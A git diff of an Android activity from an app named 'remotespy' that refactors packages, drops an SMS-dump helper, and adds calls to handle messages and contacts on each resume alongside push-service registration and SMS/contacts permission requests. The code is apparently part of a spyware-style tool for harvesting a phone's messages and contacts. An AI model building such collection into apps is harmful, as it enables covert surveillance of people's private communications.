@@ -1,28 +1,19 @@
-package org.dalol.remotespy;
+package org.dalol.remotespy.ui;
 
-import android.*;
 import android.Manifest;
-import android.content.BroadcastReceiver;
-import android.content.ContentResolver;
-import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.pm.PackageManager;
-import android.database.Cursor;
-import android.net.Uri;
-import android.os.Build;
+import android.os.Bundle;
 import android.support.annotation.NonNull;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
-import android.os.Bundle;
-import android.util.Log;
 import android.widget.Toast;
 
-import org.dalol.remotespy.services.GCMRegistrationIntentService;
-import org.dalol.remotespy.utils.DeviceUtils;
-
-import java.util.ArrayList;
+import org.dalol.remotespy.R;
+import org.dalol.remotespy.common.gcm.GCMRegistrationIntentService;
+import org.dalol.remotespy.controller.MainController;
+import org.dalol.remotespy.utilities.DeviceUtils;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -33,6 +24,8 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        //FirebaseApp.initializeApp(this);
     }
 
     @Override
@@ -45,6 +38,9 @@ public class MainActivity extends AppCompatActivity {
         super.onResume();
         //checkPermission();
 
+        MainController.getInstance().handleMessages();
+        MainController.getInstance().handleContacts();
+
         if (DeviceUtils.checkPlayServices(this)) {
             Intent gcmIntent = new Intent(this, GCMRegistrationIntentService.class);
             startService(gcmIntent);
@@ -56,7 +52,7 @@ public class MainActivity extends AppCompatActivity {
                 &&
                 ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
             //dumpSMSMessages();
-            Log.d(TAG, ""+new MessagesHelper().fetchContacts(this));
+
             //System.out.println(new MessagesHelper().fetchContacts(this));
         } else if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_SMS) ||
                 ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_CONTACTS)) {
@@ -67,10 +63,6 @@ public class MainActivity extends AppCompatActivity {
         } else {
             ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CONTACTS}, REQUEST_PERMISSION_CODE);
         }
-    }
-
-    private void dumpSMSMessages() {
-        System.out.println(new MessagesHelper().getAllSms(this));
     }
 
 
